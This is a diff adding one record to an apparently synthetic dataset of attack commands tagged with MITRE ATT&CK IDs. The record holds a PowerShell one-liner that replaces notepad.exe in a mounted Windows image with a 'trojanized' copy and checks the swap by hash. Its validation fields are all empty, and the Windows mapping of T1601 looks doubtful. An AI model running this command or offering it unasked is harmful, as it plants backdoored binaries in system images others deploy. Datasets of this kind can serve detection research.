@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$before=(Get-FileHash 'C:\\mount\\Windows\\System32\\notepad.exe' -Algorithm SHA256).Hash; Copy-Item 'C:\\staging\\notepad.exe' 'C:\\mount\\Windows\\System32\\notepad.exe' -Force; $after=(Get-FileHash 'C:\\mount\\Windows\\System32\\notepad.exe' -Algorithm SHA256).Hash; if($before -ne $after){Write-Output 'notepad.exe patched in image'}; certutil -hashfile C:\\mount\\Windows\\System32\\notepad.exe SHA256",
+  "explanation": "Trojanizes a common system binary within the offline image and verifies the change via pre/post hash comparison, directly modifying the system image per T1601.",
+  "rationale_steps": [
+    "Hash the original notepad.exe inside the mounted image.",
+    "Replace it with a trojanized version.",
+    "Re-hash and compare to confirm modification.",
+    "Record final hash using certutil for auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-dc7ef01c-d6864574",
+  "source_prompt_hash": "dc7ef01c",
+  "timestamp_utc": "2025-09-30T04:49:19.161651Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
